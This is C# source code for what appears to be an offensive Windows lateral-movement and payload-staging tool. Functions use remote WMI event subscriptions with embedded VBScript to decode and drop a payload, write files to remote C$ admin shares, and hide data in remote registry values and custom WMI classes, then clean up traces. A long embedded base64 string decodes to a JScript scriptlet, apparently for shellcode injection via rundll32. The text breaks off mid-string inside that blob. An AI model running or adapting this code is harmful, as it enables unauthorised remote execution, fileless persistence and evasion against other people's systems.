using System;
using System.IO;
using System.Net;
using System.Management;
using System.Collections.Generic;

namespace FileWrite
{
    class Program
    {
        public static string vbsp = @"
Call ServiceBuilder(pLoad, fnames, droploc)

Function ServiceChecker(ByVal base64String)
  Const Base64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/""
  Dim dataLength, sOut, groupBegin
  base64String = Replace(base64String, vbCrLf, """")
  base64String = Replace(base64String, vbTab, """")
  base64String = Replace(base64String, "" "", """")

  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, ""Base64Decode"", ""Bad Base64 string""
    Exit Function
  End If
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3
      thisChar = Mid(base64String, groupBegin + CharCounter, 1)
      If thisChar = ""="" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, ""Base64Decode"", ""Bad character In Base64 string""
        Exit Function
      End If
      nGroup = 64 * nGroup + thisData
    Next
    nGroup = Hex(nGroup)
    nGroup = String(6 - Len(nGroup), ""0"") & nGroup
    pOut = Chr(CByte(""&H"" & Mid(nGroup, 1, 2))) + _
      Chr(CByte(""&H"" & Mid(nGroup, 3, 2))) + _
      Chr(CByte(""&H"" & Mid(nGroup, 5, 2)))
    sOut = sOut & Left(pOut, numDataBytes)
  Next
  ServiceChecker = sOut
End Function

Function ServiceBuilder(ByVal codelines, fname, floc)
    Set oShell = CreateObject(""WScript.Shell"")
    Set oFile = CreateObject(""Scripting.Filesystemobject"")
    If floc = Empty Then
        floc = oShell.CurrentDirectory
    End If
    If fname = Empty Then
        fname = ""winsvc""
    End If
    filelocation = floc & ""\"" & fname
    wbsi = ServiceChecker(codelines)
    Set myfile = oFile.CreateTextFile(filelocation, False)
    myfile.WriteLine(wbsi)
    myfile.close()
    Set oShell = Nothing
    Set oFile = Nothing
End Function
";
        public static string datavals = string.Empty;

        static void WriteToFileWMI(string host, string eventName, string username, string password)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                if (!String.IsNullOrEmpty(username))
                {
                    Console.WriteLine("[*] User credentials   : {0}", username);
                    options.Username = username;
                    options.Password = password;
                }
                Console.WriteLine();

                // first create a 5 second timer on the remote host
                ManagementScope timerScope = new ManagementScope(string.Format(@"\\{0}\root\cimv2", host), options);
                ManagementClass timerClass = new ManagementClass(timerScope, new ManagementPath("__IntervalTimerInstruction"), null);
                ManagementObject myTimer = timerClass.CreateInstance();
                myTimer["IntervalBetweenEvents"] = (UInt32)5000;
                myTimer["SkipIfPassed"] = false;
                myTimer["TimerId"] = "Timer";
                try
                {
                    Console.WriteLine("[+] Creating Event Subscription {0}   : {1}", eventName, host);
                    myTimer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in creating timer object: {0}", ex.Message);
                    return;
                }

                ManagementScope scope = new ManagementScope(string.Format(@"\\{0}\root\subscription", host), options);

                // then install the __EventFilter for the timer object
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(@"SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'");
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = eventName;
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                try
                {
                    myEventFilter.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event filter   : {0}", ex.Message);
                }


                // now create the ActiveScriptEventConsumer payload (VBS)
                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();

                myEventConsumer["Name"] = eventName;
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbsp;
                myEventConsumer["KillTimeout"] = (UInt32)45;

                try
                {
                    myEventConsumer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event consumer: {0}", ex.Message);
                }


                // finally bind them together with a __FilterToConsumerBinding
                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;

                try
                {
                    myBinder.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                }


                // wait for everything to trigger
                Console.WriteLine("\r\n[+] Waiting 10 seconds for event '{0}' to trigger\r\n", eventName);
                System.Threading.Thread.Sleep(10 * 1000);
                Console.WriteLine("[+] Done...cleaning up");
                // cleanup
                try
                {
                    myTimer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing 'Timer' interval timer: {0}", ex.Message);
                }

                try
                {
                    myBinder.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing FilterToConsumerBinding: {0}", ex.Message);
                }

                try
                {
                    myEventFilter.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event filter: {0}", ex.Message);
                }

                try
                {
                    myEventConsumer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event consumer: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        static void WriteToFileSMB(string host, string droploc, string fname, string paylocation)
        {
            try
            {
                byte[] filen = null;
                var writeuncpath = String.Format(@"\\{0}\C${1}\{2}", host, droploc, fname);
                //this is meant to be updated to compile file into assembly
                if (Path.IsPathRooted(paylocation))
                {
                    filen = File.ReadAllBytes(paylocation);
                }
                Console.WriteLine("[+] Writing data to      :  {0}", host);
                File.WriteAllBytes(writeuncpath, filen);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error     :  {0}", ex.Message);
                return;
            }
        }

        static void WriteToRegKey(string host, string username, string password, string keypath, string valuename)
        {
            if (!keypath.Contains(":"))
            {
                Console.WriteLine("[-] Please put ':' inbetween hive and path: HKCU:Location\\Of\\Key");
                return;
            }
            string[] reginfo = keypath.Split(':');
            string reghive = reginfo[0];
            string wmiNameSpace = "root\\CIMv2";
            UInt32 hive = 0;
            switch (reghive.ToUpper())
            {
                case "HKCR":
                    hive = 0x80000000;
                    break;
                case "HKCU":
                    hive = 0x80000001;
                    break;
                case "HKLM":
                    hive = 0x80000002;
                    break;
                case "HKU":
                    hive = 0x80000003;
                    break;
                case "HKCC":
                    hive = 0x80000005;
                    break;
                default:
                    Console.WriteLine("[X] Error     :  Could not get the right reg hive");
                    return;
            }
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+] WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connect to to WMI    : {0}", ex.Message);
                return;
            }

            try
            {
                //Probably stay with string value only
                ManagementClass registry = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                inParams["hDefKey"] = hive;
                inParams["sSubKeyName"] = reginfo[1];
                inParams["sValueName"] = valuename;
                inParams["sValue"] = datavals;
                ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);
                if(Convert.ToInt32(outParams["ReturnValue"]) == 0)
                {
                    Console.WriteLine("[+] Created {0} {1} and put content inside", keypath, valuename);
                }
                else
                {
                    Console.WriteLine("[-] An error occured, please check values");
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Error      :  {0}", ex.Message));
                return;
            }
        }

        static void WriteToWMIClass(string host, string username, string password, string wnamespace, string classname)
        {
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wnamespace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+] WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connecto to WMI    : {0}", ex.Message);
                return;
            }
            try
            {
                var nclass = new ManagementClass(scope, new ManagementPath(string.Empty), new ObjectGetOptions());
                nclass["__CLASS"] = classname;
                nclass.Qualifiers.Add("Static", true);
                nclass.Properties.Add("WinVal", CimType.String, false);
                nclass.Properties["WinVal"].Qualifiers.Add("read", true);
                nclass["WinVal"] = datavals;
                //nclass.Properties.Add("Sizeof", CimType.String, false);
                //nclass.Properties["Sizeof"].Qualifiers.Add("read", true);
                //nclass.Properties["Sizeof"].Qualifiers.Add("Description", "Value needed for Windows");
                nclass.Put();

                Console.WriteLine("[+] Create WMI Class     :   {0} {1}", wnamespace, classname);
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Error     :  {0}", ex.Message));
                return;
            }
        }

        static void RemoveRegValue(string host, string username, string password, string keypath, string keyname)
        {
            if (!keypath.Contains(":"))
            {
                Console.WriteLine("[-] Please put ':' inbetween hive and path: HKCU:Location\\Of\\Key");
                return;
            }
            if (!String.IsNullOrEmpty(host))
            {
                host = "127.0.0.1";
            }
            string[] reginfo = keypath.Split(':');
            string reghive = reginfo[0];
            string wmiNameSpace = "root\\CIMv2";
            UInt32 hive = 0;
            switch (reghive.ToUpper())
            {
                case "HKCR":
                    hive = 0x80000000;
                    break;
                case "HKCU":
                    hive = 0x80000001;
                    break;
                case "HKLM":
                    hive = 0x80000002;
                    break;
                case "HKU":
                    hive = 0x80000003;
                    break;
                case "HKCC":
                    hive = 0x80000005;
                    break;
                default:
                    Console.WriteLine("[X] Error     :  Could not get the right reg hive");
                    return;
            }
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+]  WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connecto to WMI    : {0}", ex.Message);
                return;
            }

            try
            {
                //Probably stay with string value only
                ManagementClass registry = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = registry.GetMethodParameters("DeleteValue");
                inParams["hDefKey"] = hive;
                inParams["sSubKeyName"] = keypath;
                inParams["sValueName"] = keyname;
                ManagementBaseObject outParams1 = registry.InvokeMethod("DeleteValue", inParams, null);
                Console.WriteLine("[+] Deleted value at {0} {1}", keypath, keyname);
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                return;
            }
        }

        static void RemoveWMIClass(string host, string username, string password, string wnamespace, string classname)
        {
            if (!String.IsNullOrEmpty(wnamespace))
            {
                wnamespace = "root\\CIMv2";
            }
            if (!String.IsNullOrEmpty(host))
            {
                host = "127.0.0.1";
            }
            ConnectionOptions options = new ConnectionOptions();
            Console.WriteLine("[+] Target             : {0}", host);
            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("[+] User               : {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();
            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wnamespace), options);
            try
            {
                scope.Connect();
                Console.WriteLine("[+]  WMI connection established");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Failed to connecto to WMI    : {0}", ex.Message);
                return;
            }
            try
            {
                var rmclass = new ManagementClass(scope, new ManagementPath(classname), new ObjectGetOptions());
                rmclass.Delete();
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
                return;
            }
        }

        static void GetFileContent(string paylocation, string droploc, string fname, string dtype)
        {
            bool uricheck = Uri.IsWellFormedUriString(paylocation, UriKind.RelativeOrAbsolute);
            if (paylocation == "local")
            {
                String plfile = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHBhY2thZ2U+CiAgPGNvbXBvbmVudAogICAgaWQ9ImR1bW15Ij4KICAgIDxyZWdpc3RyYXRpb24KICAgICAgZGVzY3JpcHRpb249ImR1bW15IgogICAgICBwcm9naWQ9ImR1bW15IgogICAgICB2ZXJzaW9uPSIxLjAwIgogICAgICByZW1vdGFibGU9IlRydWUiPgogICAgICA8c2NyaXB0CiAgICAgICAgbGFuZ3VhZ2U9IkpTY3JpcHQiPjwhW0NEQVRBWwp2YXIgYmluYXJ5ID0gInJ1bmRsbDMyLmV4ZSI7CnZhciBjb2RlID0gIjZBQUFBQUJaU0lIQk5TWUFBTG9BQUFBQVNZSEFOVUlBQUVHNUFBQUFBRlpJaWVaSWcrVHdTSVBzSU9nRkFBQUFTSW4wWHNQcHl4d0FBSUFTQUFDbEVnQUFQRE1BQURJVEFBQXVGQUFBUkRNQUFENFVBQUNhRkFBQVZETUFBSm9VQUFBNEZRQUFaRE1BQURnVkFBQitKUUFBZkRNQUFINGxBQURESlFBQWxETUFBTU1sQUFCb0tBQUFvRE1BQUdnb0FBRFJLUUFBckRNQUFORXBBQUErS2dBQXVETUFBRDRxQUFCaUtnQUFQRE1BQUdJcUFBRE5Ld0FBeURNQUFNMHJBQUNTTEFBQTRETUFBSklzQUFDb0xBQUErRE1BQU1zc0FBQnlNZ0FBQURRQUFJQXlBQUFPTXdBQUxETUFBQ0F6QUFBck13QUFQRE1BQUM5eWRYTjBZeTlpWkdJd1ptRXpaV1UxWm1aaU5HTmpNV0V4WWpVelkySmxPRE0wTkdFeVlqZ3pZakZoWlRKaFhHeHBZbkpoY25sY1kyOXlaVnh6Y21OY2MzUnlYSEJoZEhSbGNtNHVjbk1Bd0JBQVFBRUFBQUJQQUFBQUFBQUFBTm9HQUFCSkFBQUF3QkFBUUFFQUFBQlBBQUFBQUFBQUFMTUZBQUFVQUFBQXdCQUFRQUVBQUFCUEFBQUFBQUFBQUxNRkFBQWhBQUFBd0JBQVFBRUFBQUJQQUFBQUFBQUFBS2NGQUFBaEFBQUFjM0pqWEhWMGFXeHpMbkp6QUFBQUFIQVJBRUFCQUFBQURBQUFBQUFBQUFDWUFRQUFHUUFBQUhBUkFFQUJBQUFBREFBQUFBQUFBQUNZQVFBQU1BQUFBSEFSQUVBQkFBQUFEQUFBQUFBQUFBQ1BBUUFBRndBQUFBQUFBQUJzYVdKeVlYSjVYR052Y21WY2MzSmpYSE4wY2x4d1lYUjBaWEp1TG5KekFBQUFBQURNRVFCQUFRQUFBQjhBQUFBQUFBQUFRZ1VBQUJJQUFBRE1FUUJBQVFBQUFCOEFBQUFBQUFBQVFnVUFBQ2dBQUFETUVRQkFBUUFBQUI4QUFBQUFBQUFBTlFZQUFCVUFBQURNRVFCQUFRQUFBQjhBQUFBQUFBQUFZd1lBQUJVQUFBRE1FUUJBQVFBQUFCOEFBQUFBQUFBQVpBWUFBQlVBQUFBWUFBQUFBSUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUJJZyt3b1REbktkUlZJaWRCTWljSkppY0RvRVJvQUFJWEFENVRBNndJeHdFaUR4Q2pETWNCSk9jQjBEVVNLREFKRWlBd0JTUC9BNis3RHVBVVZBQUJGTWNCSk9kQnpMMGFLREFGRmhNbDFCVW4vd092dFJZMVI0RUdBK1dGRkQ3YkpSUSsyMGtVUFF0RkVhOGdoUVErMndrUUJ5T3ZhdzBTTFVRaEZoZEowREErMzByQUJRVG5TZHdSekF6SEF3NHRSREVVUHQ4QkVPY0ozODNMdlpvTzVHQUVBQUFCMTUwRVB0OEU1UVJBUGs4RERRVlpXVjFOSWdld29DQUFBU0l1MEpIQUlBQUJJeDhELy8vLy9TVG54RDRLZkFBQUFTSVhTRDRTV0FBQUFUWVhKRDRTTkFBQUFTSW5YU0NuM0Q0S0JBQUFBUlRIU1NZSDZBQUVBQUhRS1NvbDAxQ2hKLzhMcjdVai96a1V4MGttSjgwaUo4MGlENndGeUYwMDUwWFJoUncrMk5CQkovOEpPaVZ6MEtFbUoyK3ZqTWR0SU9mdDNPMHlOTkJsSmlmSk5oZEo0TEUwNXluTkRUbzBjRTBrNTAzTkpSdysySEJaSE9Cd1FkUVZKLzhycjNVNkxWTndvU1lQNkFVd1IwK3ZEU0luWVNJSEVLQWdBQUZ0ZlhrRmV3MHlOQmFmOS8vOU1pY25yQ2t5TkJXdjkvLzlNaWRGTWljcnJDa3lOQlhUOS8vOU1pZG5vOUI0QUFBOExNY0JKT2NCMENJZ1VBVWovd092encwRlhRVlpXVjFOSWcrd2dpYzlsU0lzRUpXQUFBQUJJaTBBWVNJdFlJRXlMY0NneDlraURlekFBZENKTWl6c1B0MU5JU0l0TFVPaEIvdi8vT2ZoMENrdzU4MHlKKzNYZDZ3UklpM01nU0lud1NJUEVJRnRmWGtGZVFWL0RRVmRCVmtGVlFWUldWMVZUU0lQc0tFaGpRVHlMaEFpSUFBQUFTQUhJZEdpSjEwaUp6a1NMZUJTTFNCeEVpMkFnUkl0b0pFZ0I4VWlKVENRZ1NRSDBTUUgxTWR0Rk1mWk5PZjUwUGt5SjlVT0xETFJJQWZGSXg4TC8vLy8vZ0h3UkFRQklqVklCZGZWTWpYVUI2Sy85Ly84NStIWFNRUSszUkcwQVNJdE1KQ0NMSElGSUFmUHJBakhiU0luWVNJUEVLRnRkWDE1QlhFRmRRVjVCWDhOQlYwRldRVlZCVkZaWFZWTklnZXdZQVFBQVNJbldNZEptZ1RsTldyZ0FBQUFBRDRWOUR3QUFUWW5HVEdOQlBESFNRWUU4Q0ZCRkFBQzRBQUFBQUErRllROEFBRWlKakNUb0FBQUFTUUhJUVErM1FCUkpqUlFBU1kwTUFFaUR3UmhCRDdkQUJtYUpSQ1JlU1kxRy8waUpoQ1NnQUFBQU1jQk5pZkJKZytnRVRBOUN3RXlKaENUZ0FBQUFTWTFHRDBpSmhDU3dBQUFBU0kxR0FVaUpoQ1RRQUFBQVNZMUdQMGlKaENUd0FBQUFTTWZBK2YvLy8wd3A4RWlKaENTUUFBQUFSSW53ZytBRFRZbndTWVBnL0V3QjhraUR3aGRJaVpRa3FBQUFBREhTUlRISlNJbU1KSmdBQUFCSWlVd2tVRXlKZENSSVNJbDBKRUJJaVlRazJBQUFBRXlKaENUSUFBQUFaa1E3VENSZUQ0UnFEZ0FBVFlYMkQ0Um5EZ0FBUkltTUpJd0FBQUJJaVZRa2NFbUQvZ2QzSjBtRC9nRjFPWW9HTWNsSWcva0lkSFJJalZFQlRJdEVKRkJCT0FRSVNJblJkZWpwT2c0QUFFRzVDQUFBQUVpSjhVeUo4a3lMUkNSUTZOcjcvLy9yUFVtRC9nSjFjYjhJQUFBQVNJdE1KRkJJaWY1TU9mZHlIMGlOZnY5SWpWa0JUSW55VEl0RUpFQk5pZkhvcVB2Ly8waUoyWVRBZE5sTU9mWVBrOENFd0ErRjNRMEFBRVNMakNTTUFBQUFRZi9CU0lORUpGQW9TSXRVSkhCSWc4SW9TSU9FSktnQUFBQW9USXQwSkVoSWkzUWtRT2tpLy8vL2lnYUlSQ1E5U0l1TUpLZ0FBQUJNaWZCSWk1UWs0QUFBQUVnNXdnK0RxUWdBQUV5TlFQOU5PZkFQZzc0TkFBQkppYzJLWEFiL1NQL0pUSW5BT2x3a1BYVFhTSU84SkxBQUFBQUpENE0rLy8vL1NJdE1KRkJJaVl3aytBQUFBRWpIaENRQUFRQUFDQUFBQUVpTGhDVFFBQUFBU0ltRUpBZ0JBQUJJaTRRa29BQUFBRWlKaENRUUFRQUFNY0JJaVVRa1lFbUp6MFV4NUloY0pENU1pWVFrd0FBQUFFaUxoQ1R3QUFBQVRBSGdTSVA0QncrSFFnVUFBRWlMUkNSZ0pBRVBoVFVGQUFCTWlXUWtlRWlEcENTNEFBQUFBRVV4NUV5SnZDU0FBQUFBU1lQOENBK0VWd0lBQUVPS1JPY1Bpa3drUFRESWlFUWtQRU9LUk9jT01NaUlSQ1E3UTRwRTV3MHd5SWhFSkRwRGlrVG5ERERJaUVRa09VT0tST2NMTU1pSVJDUTRRNHBFNXdvd3lJaEVKRGREaWtUbkNURElpRVFrTmtPS1JPY0lNTWlJUkNRMFE0cEU1d2N3eUloRUpERkRpa1RuQmpESWlFUWtMME9LUk9jRk1NaUlSQ1F0UTRwRTV3UXd5SWhFSkN4RGlrVG5BekRJaUVRa0swT0tST2NDTU1pSVJDUS9RNHBzNXdGQU1NMUhpaFRuUVRES1E0cE01UStLUkNRK01NR0lUQ1JvUTRwTTVRNHd3WWhNSkRWRGlremxEVERCaUV3a00wT0tUT1VNTU1HSVRDUXlRNHBNNVFzd3dZaE1KREJEaWt6bENqREJpRXdrTGtlS2ZPVUpRVERIUjRwMDVRaEJNTVpEaW56bEIwQXd4ME9LZE9VR1FEREdRNHBjNVFVd3cwZUtYT1VFUVRERFI0cE01UU5CTU1GRGlsVGxBakRDUTRwTTVRRXd3VTJKNkVlS2JPVUFRVERGUlFqVlRZbkZRUStVd2tBSTZRK1V3UURKUkFqUkNsUWtQdytVd3NEaUFrUUtUQ1FyUVErVXdrSEE0Z05CQ05KQkNNcEVDbHdrTEErVXdRcGNKQzBQbE1JQTBnaktRQXAwSkM5QkQ1VEFRY0RnQWtBS2ZDUXhENVRCd09FRFJBakJDTkhBNFFSRUNORkVDblFrTkErVXdrUUtmQ1EyVEl1OEpJQUFBQUJCRDVUQVJRREFRUWpRaWtRa0xncEVKRGRCRDVUQlFjRGhBb3BFSkRBS1JDUTRENVRDd09JRFJBaktSQWpDaWtRa01ncEVKRGxCRDVUQWlrUWtNd3BFSkRwQkQ1VEJSUURKUlFqQmlrUWtOUXBFSkR0QkQ1VEFRY0RnQW9wRUpHZ0tSQ1E4RDdiSlFRK1V3a0hBNGdORkNNSkZDTXBCd09JRVFRalNRUSsyMHNIaUNBbktaa0tKbENTNEFBQUFTWVBFQXVtZi9mLy9NZmFLWENRK1RJdGtKSGhJZy80RWRFRklpZkpJLzhaRUQ3ZUVWTGdBQUFCbVJZWEFkT1ZJd2VJRVRBSGlTSXQ4SkdCQmlmbEJnT0VCU0kyTUpQZ0FBQURvM0JjQUFFQUkrQ1FCU0lsRUpHRHJ1VW1EeEVCSmc4VkFTWVBIUU9rQi9mLy9RWXBQRDRwRUpEMHd3WWhNSkR4QmlrOE9NTUdJVENRN1FZcFBEVERCaUV3a09rR0tUd3d3d1loTUpEbEJpazhMTU1HSVRDUTRRWXBQQ2pEQmlFd2tOMEdLVHdrd3dZaE1KRFZCaWs4SU1NR0lUQ1F6UVlwUEJ6REJpRXdrTUVHS1R3WXd3WWhNSkM1QmlrOEZNTUdJVENRdFFZcFBCRERCaUV3a0xFR0tUd013d1loTUpDdEZpbmNDUVRER1FZcC9BVUF3eDBXS0QwRXd3VUdLUlE4dzJJaEVKRFpCaWtVT01OaUlSQ1EwUVlwRkRURFlpRVFrTWtHS1JRd3cySWhFSkRGQmlrVUxNTmlJUkNRdlRJbGtKSGhGaW1VS1FURGNRWXB0Q1VBdzNVeUp2Q1NBQUFBQVJZcDlDRUV3MzBHS2RRZEFNTjVGaWwwR1FURGJSWXBWQlVFdzJrV0tSUVJCTU5oQmlsVURNTnBCaWswQ01ObEJpa1VCTU5oTWlXd2thRVdLYlFCQk1OMUZDTTFCRDVUQlFBajRENVRBQU1CRUNNaEVDUEVQbE1IQTRRSUtWQ1FyUVErVXdVSEE0UU5CQ01sQkNNRkVDa1FrTEErVXdFUUtWQ1F0RDVUQkFNa0l3VVFLWENRdUQ1VEN3T0lDUUFwMEpEQVBsTURBNEFNSTBBakl3T0FFUkFqSVJBcDhKRE1QbE1GQUNtd2tOUStVd2dEU0NNcEVDbVFrTjB5TFpDUjRRUStVd0VIQTRBS0tUQ1F2Q2t3a09BK1V3Y0RoQTBRSXdRalJpbFFrTVFwVUpEa1BsTUpFaWtRa01rUUtSQ1E2UVErVXdFVUF3RUVJMElwVUpEUUtWQ1E3RDVUQ3dPSUNSSXBNSkRaRUNrd2tQQSsyd0VFUGxNRkJ3T0VEUVFqUlJRakJRY0RoQkVFSXlVVVB0c0ZCd2VBSVprRUp3SFVmU1lQRUVFeUxiQ1JvU1lQRkVFeUx2Q1NBQUFBQVNZUEhFSXBjSkQ3ckdraU5qQ1Q0QUFBQVRJbmlSVEhKNkc0VkFBQklpVVFrWU92SFNJdUVKTEFBQUFCS2pRd2dTSXRFSkdBa0FVaUQrUWQzQ0lUQUQ0U0gvZi8vVEl0MEpGQklpNVFra0FBQUFFMk5CQlpGaWt3V0Q0cE1KRDFCTU1sRWlFd2tQRVdLVEJZT1FUREpSSWhNSkR0Rmlrd1dEVUV3eVVTSVRDUTZSWXBNRmd4Qk1NbEVpRXdrT1VXS1RCWUxRVERKUkloTUpEaEZpa3dXQ2tFd3lVU0lUQ1EzUllwTUZnbEJNTWxFaUV3a05rV0tUQllJUVRESlJJaE1KRFJGaWt3V0IwRXd5VVNJVENReFRJdVVKTUFBQUFCSGlrd0NEMEV3MlVTSVRDUm9SNHBNQWc1Qk1ObEVpRXdrTlVlS1RBSU5RVERaUkloTUpETkhpa3dDREVFdzJVU0lUQ1F5UjRwTUFndEJNTmxFaUV3a01FZUtUQUlLUVREWlJJaE1KQzlIaWt3Q0NVRXcyVVNJVENRdVI0cE1BZ2hCTU5sRWlFd2tMVWVLVEFJSFFURFpSSWhNSkN4SGlrd0NCa0V3MlVTSVRDUXJSNHBzQWdWQk1OMUhpbndDQkVFdzMwT0tmQUlEUUREZlI0cGNBZ0pCTU50SGlrd0NBVUV3MlVNeUhBSkZpa1FXQmtFd3lFU0lSQ1EvUllwa0ZnVkJNTXlKM2tHS2JCWUVRREROUVlwY0ZnTXd5MFdLVkJZQ1FUREtSWXBFRmdGQk1NaEJNZ3dXUUFqT1FRK1V4a1VJd1ErVXdRREpSQWp4UlFqVFFRK1V3RUhBNEFKQUNOOFBsTUxBNGdORUNNSUl5a0VJN3crVXdVVUk1VUVQbE1CRkFNQkJDTWlLVENRL0NFd2tLMEVQbE1GQndPRUNpa3drTEFwTUpERVBsTUhBNFFORUNNbEVDTUhBNFFRSTBZcFVKQzBLVkNRMEQ1VENSSXBFSkM1RUNrUWtOa0VQbE1CRkFNQkJDTkNLVkNRdkNsUWtOMEVQbE1GQndPRUNpbFFrTUFwVUpEZ1BsTUxBNGdORUNNcEVDTUpFaWtRa01rUUtSQ1E1UVErVXdFU0tUQ1F6UkFwTUpEcEJENVRCUlFESlJRakJSSXBFSkRWRUNrUWtPMEVQbE1CQndPQUNSSXBVSkdoRUNsUWtQQSsyeVVFUGxNSkJ3T0lEUlFqQ1JRaktRY0RpQkVFSTBrVVB0c0pCd2VBSVprRUp5QStFSC9mLy80VEFENVhEU0kyTUpQZ0FBQUJJaTVRa2tBQUFBRUdKd2VpZEVnQUFDTmpwKy9iLy8wRzZBUUFBQUVHNEFRQUFBRVV4eWJvQkFBQUFNY0JLalF3SVREbnhENFB0QkFBQWlnd09RamdNRm5NUlNJME1Ba2ovd1VtSnlFMHB5REhBNnpKMUlVai93RXc1d0VtSndya0FBQUFBVEE5RTBVZ1BSY0ZJaWNGSUFkRk1pZERyRDBpTlNnRkJ1QUVBQUFBeHdFbUowVXlORkFGSWljcE5PZkp5bTc0QkFBQUF1QUVBQUFBeHlVRzdBUUFBQUVVeDBrbU5GQXBNT2ZJUGczd0VBQUJJaTN3a1FJb1VGemdVTjNZU1M0MFVFMGovd2tpSjBFZ3B5RVV4MHVzeWRTRkovOEpKT2NKTWlkYTZBQUFBQUVnUFJQSk1EMFhTVEluU1RBSGFTWW55Nnc5SmpWTUJ1QUVBQUFCRk1kSk1pZGxLalRRU1NZblRUSXQwSkVoTU9mWnlrVWs1eVVrUFI4bEpEMGZBVFlueFNTbkpENEphQkFBQVNZbkNTUUhLVEl0RUpFQklpN3drMkFBQUFBK0NTZ1FBQUUwNThnK0hVQVFBQUVtTk5BQkZNZEpOaWRCTU9kRVBoSllBQUFCTWkxUWtRRWVLSEFKTmpWQUJSam9jQm5UaFREbkpUQTlIeVVVeDBqSEFTWVArQkhKRFNJdWNKTWdBQUFCTWkxd2tRRUdLTkFOTWkxd2tRRVdLWEFNQlNRK3I4a2lMZENSQVRRK3Iya1NLWEFZQ1RRK3Iya1NLWEFZRFRRK3Iya2lEd0FSSU9jTjF4VWlGLzNRWFNBTkVKRUF4OWtTS0hEQk5ENnZhU1AvR1NEbjNkZkJKLzhGSng4UC8vLy8vVEluSTZZZ0JBQUJCdWdFQUFBQk1pZkl4OXI4QkFBQUFSVEhiVEkwTU4wazUwUStEa1FBQUFFbUorVW4zMFVtSjFra3A5azBCemtrNTFnK0ROUU1BQUVtSjhVbjMwVWtCMFUwcDJVazUwUStETEFNQUFFaU5Yd0ZJaTFRa1FFYUtEQXBHT0F3eWN4RklqUncrU1AvRFNZbmFUU25hTWZickwzVWlTUC9HVERuV1NJbnlRYmtBQUFBQVNROUUwVWtQUmZGSWlmTklBZnRJaWRickMw